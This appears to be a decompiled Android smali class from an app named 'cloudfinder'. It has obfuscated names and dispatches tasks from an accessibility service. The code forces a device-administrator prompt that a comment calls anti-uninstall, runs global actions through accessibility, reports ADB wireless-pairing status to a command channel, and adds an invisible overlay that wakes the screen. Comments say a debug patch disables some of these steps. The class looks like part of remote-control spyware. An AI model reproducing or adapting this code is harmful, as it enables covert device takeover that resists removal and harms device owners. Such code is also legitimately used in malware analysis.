.class public final synthetic Lڛڜڕڰڑ/ء;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field public final synthetic آ:I

.field public final synthetic أ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;


# direct methods
.method public synthetic constructor <init>(Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;I)V
    .locals 0

    iput p2, p0, Lڛڜڕڰڑ/ء;->آ:I

    iput-object p1, p0, Lڛڜڕڰڑ/ء;->أ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method private final ؋()V
    .locals 1

    # 调试模式：P1（电池白名单 + 自启动引导）整条禁用，直接返回
    return-void
.end method


# virtual methods
.method public final run()V
    .locals 10

    iget v0, p0, Lڛڜڕڰڑ/ء;->آ:I

    const-string v1, "MyAccessSvc"

    packed-switch v0, :pswitch_data_0

    goto/16 :goto_5

    :pswitch_0
    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    const/4 v0, 0x3

    iget-object v1, p0, Lڛڜڕڰڑ/ء;->أ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    invoke-virtual {v1, v0}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    return-void

    :pswitch_1
    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    iget-object v0, p0, Lڛڜڕڰڑ/ء;->أ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    invoke-static {v0}, Lڗًقڔ/؋;->پ(Landroid/accessibilityservice/AccessibilityService;)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    new-instance v3, Ljava/lang/Thread;

    new-instance v4, Lڛڜڕڰڑ/آ;

    invoke-direct {v4, v1, v2, v0}, Lڛڜڕڰڑ/آ;-><init>(JLcom/lite/cloudfinder/accessibility/MyAccessibilityService;)V

    invoke-direct {v3, v4}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v3}, Ljava/lang/Thread;->start()V

    return-void

    :pswitch_2
    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    iget-object v0, p0, Lڛڜڕڰڑ/ء;->أ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    # 调试模式：跳过设备管理器激活（防卸载）
    const-string v2, "inject_state"
    const/4 v3, 0x0
    invoke-virtual {v0, v2, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
    move-result-object v2
    const-string v3, "debug_mode"
    const/4 v4, 0x1
    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z
    move-result v2
    if-eqz v2, :devadmin_go
    return-void

    :devadmin_go
    :try_start_0
    new-instance v2, Landroid/content/Intent;

    const-class v3, Lcom/lite/cloudfinder/activity/DeviceAdminActivity;

    invoke-direct {v2, v0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v3, 0x50000000

    invoke-virtual {v2, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v0, v2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    const-string v2, "DeviceAdminActivity start error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_0
    return-void

    :pswitch_3
    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    iget-object v0, p0, Lڛڜڕڰڑ/ء;->أ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    invoke-static {v0}, Lڗًقڔ/؋;->پ(Landroid/accessibilityservice/AccessibilityService;)V

    return-void

    :pswitch_4
    iget-object v0, p0, Lڛڜڕڰڑ/ء;->أ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    sget-object v1, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    const/4 v1, 0x1

    sput-boolean v1, Lسۄھؤۏ۫/؋;->د:Z

    invoke-static {v0}, Lڃٷښـ۝ۼ/ؠ;->ص(Landroid/content/Context;)V

    new-instance v1, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v2

    invoke-direct {v1, v2}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v2, Lڛڜڕڰڑ/ء;

    const/16 v3, 0x8

    invoke-direct {v2, v0, v3}, Lڛڜڕڰڑ/ء;-><init>(Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;I)V

    const-wide/16 v3, 0x1f40

    invoke-virtual {v1, v2, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void

    :pswitch_5
    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    iget-object v0, p0, Lڛڜڕڰڑ/ء;->أ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    :try_start_1
    invoke-virtual {v0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ٴ()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_1
    return-void

    :pswitch_6
    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    iget-object v0, p0, Lڛڜڕڰڑ/ء;->أ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    :try_start_2
    invoke-virtual {v0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ٴ()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    goto :goto_2

    :catch_2
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_2
    return-void

    :pswitch_7
    invoke-direct {p0}, Lڛڜڕڰڑ/ء;->؋()V

    return-void

    :pswitch_8
    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    const-wide/16 v0, 0x7d0

    :try_start_3
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_3
    .catch Ljava/lang/InterruptedException; {:try_start_3 .. :try_end_3} :catch_3

    :catch_3
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lڛڜڕڰڑ/ء;

    const/4 v2, 0x5

    iget-object v3, p0, Lڛڜڕڰڑ/ء;->أ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    invoke-direct {v1, v3, v2}, Lڛڜڕڰڑ/ء;-><init>(Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;I)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    return-void

    :pswitch_9
    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    iget-object v0, p0, Lڛڜڕڰڑ/ء;->أ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    :try_start_4
    invoke-static {v0}, Lڜأِجطّثٮ/ء;->ة(Landroid/content/Context;)Lڜأِجطّثٮ/ء;

    move-result-object v0

    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    const-string v3, "type"

    const-string v4, "status"

    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v3, "supported"

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    invoke-static {}, Lڜأِجطّثٮ/ء;->خ()Z

    move-result v4

    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v3, "wifi"

    invoke-virtual {v0}, Lڜأِجطّثٮ/ء;->د()Z

    move-result v4

    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v3, "paired"

    invoke-virtual {v0}, Lڜأِجطّثٮ/ء;->ج()Z

    move-result v4

    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v3, "connected"

    invoke-static {}, Lڜأِجطّثٮ/ؠ;->أ()Lڜأِجطّثٮ/ؠ;

    move-result-object v4

    invoke-virtual {v4}, Lڜأِجطّثٮ/ؠ;->ئ()Z

    move-result v4

    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v3, "message"

    invoke-static {}, Lڜأِجطّثٮ/ء;->خ()Z

    move-result v4

    if-eqz v4, :cond_1

    invoke-virtual {v0}, Lڜأِجطّثٮ/ء;->د()Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "\u5c31\u7eea"

    goto :goto_3

    :cond_0
    const-string v0, "\u9700\u8981WiFi"

    goto :goto_3

    :cond_1
    const-string v0, "\u9700\u8981Android 11+"

    :goto_3
    invoke-virtual {v2, v3, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-static {}, Lڜٟٱڀ/د;->ؠ()Lڜٟٱڀ/د;

    move-result-object v0

    if-eqz v0, :cond_2

    invoke-virtual {v0}, Lڜٟٱڀ/د;->آ()Z

    move-result v3

    if-eqz v3, :cond_2

    const-string v3, "adbPairStatus"

    invoke-virtual {v0, v3, v2}, Lڜٟٱڀ/د;->ؤ(Ljava/lang/String;Lorg/json/JSONObject;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4

    goto :goto_4

    :catch_4
    move-exception v0

    const-string v2, "ADB status report error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_2
    :goto_4
    return-void

    :goto_5
    iget-object v0, p0, Lڛڜڕڰڑ/ء;->أ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    const-string v1, "CommandDispatcher"

    :try_start_5
    const-string v2, "window"

    invoke-virtual {v0, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/WindowManager;

    new-instance v3, Landroid/view/View;

    invoke-direct {v3, v0}, Landroid/view/View;-><init>(Landroid/content/Context;)V

    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    const/4 v5, 0x1

    const/4 v6, 0x1

    const/16 v7, 0x7f0

    const v8, 0x280098

    const/4 v9, -0x3

    move-object v4, v0

    invoke-direct/range {v4 .. v9}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    const v4, 0x800033

    iput v4, v0, Landroid/view/WindowManager$LayoutParams;->gravity:I

    invoke-interface {v2, v3, v0}, Landroid/view/ViewManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    new-instance v4, Landroidx/constraintlayout/motion/widget/؋;

    const/16 v5, 0x17

    invoke-direct {v4, v5, v2, v3}, Landroidx/constraintlayout/motion/widget/؋;-><init>(ILjava/lang/Object;Ljava/lang/Object;)V

    const-wide/16 v2, 0xbb8

    invoke-virtual {v0, v4, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    const-string v0, "wakeup: accessibility overlay with TURN_SCREEN_ON added"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_5

    goto :goto_6

    :catch_5
    move-exception v0

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "wakeup overlay failed: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :goto_6
    return-void

    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_9
        :pswitch_8
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method
